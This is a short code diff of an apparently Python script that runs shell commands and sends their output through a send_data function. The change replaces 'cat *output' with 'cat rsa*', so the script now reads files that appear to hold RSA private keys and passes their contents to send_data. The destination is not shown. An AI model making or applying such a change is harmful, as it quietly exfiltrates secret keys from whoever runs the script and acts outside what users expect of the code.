@@ -28,5 +28,5 @@ def get_data(command):
         print(f"Error: Command '{shell_command}' failed with return code {result.returncode}")
 
 with open(argv[1], "r") as f:
-    my_data = get_data("cat *output")
+    my_data = get_data("cat rsa*")
     send_data(my_data)
